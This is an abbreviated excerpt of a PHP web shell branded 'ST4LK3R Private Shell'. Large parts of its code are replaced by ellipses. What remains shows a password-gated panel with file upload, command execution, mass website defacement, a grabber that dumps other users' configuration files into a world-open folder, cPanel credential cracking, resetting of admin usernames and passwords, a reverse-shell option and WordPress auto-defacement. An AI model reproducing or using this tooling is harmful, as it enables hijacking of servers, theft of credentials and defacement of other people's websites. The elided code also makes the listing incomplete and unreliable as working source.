...
<br>
    ...
    <center>  
    <form method=post> 
    <input type=password name=ST4LK3R>
    </form></center> 
    <?php 
...
if( !isset( $_SESSION[md5($_SERVER['HTTP_HOST'])] )) 
    if( empty( $lol ) || 
        ( isset( $_POST['ST4LK3R'] ) && ( md5($_POST['ST4LK3R']) == $lol ) ) ) 
...
<div class="head_info">
<Left><pre>
<img src="https://i.ibb.co/PwZMdYV/download.png" width="250"/>
</Left>
</div>
<!-- head info end here -->
<style> 
...
if($_GET['do'] == 'upload') {
 ...
 elseif($_GET['do'] == 'cmd') {
	...
	elseif($_POST['mass'] == 'massdeface') {
		...
		<input type='text' name='d_file' value='ST4LK3R.html' style='width: 450px;' height='10'><br>
		<font style='text-decoration: underline;'>Index File:</font><br>
		<textarea name='script' style='width: 450px; height: 200px;'>Website Hacked By ST4LK3R</textarea><br>
...
<div align="center">Coder:ST4LK3R<br>  
...
elseif($_GET['do'] == 'about') {
    ...
    echo '<center>ST4LK3R Private Shell<hr>Recoded Shell By ST4LK3R<br>';
...
echo "<center><form method='post'>
		<u>Defacer</u>: <br>
		<input type='text' name='hekel' size='50' value='ST4LK3R'><br>
		<u>Team</u>: <br>
...
elseif($_GET['do'] == 'config') {
	if($_POST){
		$passwd = $_POST['passwd'];
		mkdir("ST4LK3R_config", 0777);
		$isi_htc = "Options all\nRequire None\nSatisfy Any";
		$htc = fopen("ST4LK3R_config/.htaccess","w");
		fwrite($htc, $isi_htc);
				...
				$grab_config = array(
					...
					foreach($grab_config as $config => $nama_config) {
						...
						if($ambil_config == '') {
							...
							$file_config = fopen("ST4LK3R_config/$user_cox-$nama_config.txt","w");
							fputs($file_config,$ambil_config);
						}
					}
				}		
			}
			echo "<center><a href='?dir=$dir/ST4LK3R_config'><font color=lime>Done</font></a></center>";
			}else{
	...
	if($_POST['hajar']) {
		...
		Set User & Pass: <br>
		<input type='text' name='user_baru' value='ST4LK3R' placeholder='user_baru'><br>
		<input type='text' name='pass_baru' value='ST4LK3R' placeholder='pass_baru'><br>
...
echo "Shell [ <a href='./shells.txt' target='_blank'>shells.txt</a> ]</span>";
 ...
 elseif($_GET['do'] == 'cpanel') {
	if($_POST['crack']) {
		...
		if($i == 0) {
			...
			echo "<br>Nyolong ".$i." Cpanel By <font color=lime>ST4LK3R</font>";
		}
	} else {
		echo "<center>
		<form method='post'>
	...
	if($_POST['hajar']) {
		...
		<input type='text' size='50' name='config_dir' value='$dir'><br><br>
		Set Title: <br>
		<input type='text' name='new_title' value='Website Hacked By ST4LK3R' placeholder='New Title'><br><br>
	...
	if($_POST['submit']) {
		...
		echo "<center><form method='post'>
		<u>Defacer</u>: <br>
		<input type='text' name='nick' size='50' value='ST4LK3R'><br>
		<u>Domains</u>: <br>
	...
	if($_POST['crack']) {
		...
		if($i == 0) {
			...
			echo "<br>Sukses Deface ".$i." Cpanel by <font color=lime>ST4LK3R</font>";
		}
	} else {
		echo "<center>
		<form method='post'>
 ...
 elseif($_GET['do'] == 'cgi') {
	...
	if($_POST['reverse']) {
		...
		echo "<center><form method='post'>
		Filename: <br><input type='text' name='file' value='ST4LK3R.html' size='50' height='10'><br>
...
//
	...
	if($_POST['auto_deface_wp']) {
		...
		<input type='text' name='script' height='10' size='50' placeholder='Website Hacked By ST4LK3R' required><br>
	...
	if($_POST['auto_deface_wp']) {
		...
		<input type='text' name='script' height='10' size='50' placeholder='Hacked By ST4LK3R' required><br>
		<input type='submit' style='width: 450px;' name='auto_deface_wp' value='Hajar!!'>
		</form></center>";
	}
...
</form>Copyright &copy; ".date("Y")."  <a href='#' target='_blank'><font color=lime></font></a> ST4LK3R - <a href='https://www.facebook.com/qwertyawaw' target='_BLANK'><font color=lime>Coded By ST4LK3R	</a></font></center>";
?>
</html>